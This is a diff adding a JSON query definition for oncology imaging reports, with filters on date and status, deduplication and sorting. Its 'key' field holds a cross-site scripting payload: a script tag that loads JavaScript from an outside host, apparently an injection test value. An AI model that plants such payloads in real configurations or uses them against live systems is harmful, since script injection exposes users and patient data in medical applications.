@@ -1,0 +1,31 @@
+{
+  "id": "imagingReports.onco.general",
+  "items": [
+    [
+      {
+        "key": "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+        "query": {
+          "from": "imagingReport",
+          "filter": {
+            "must": [
+              {
+                "date": {
+                  "range": {
+                    "lte": "now/d"
+                  }
+                }
+              },
+              {
+                "attributes.status": {
+                  "neq": "registered"
+                }
+              }
+            ]
+          },
+          "dedup": true,
+          "sort": [{ "date": "asc" }]
+        }
+      }
+    ]
+  ]
+}
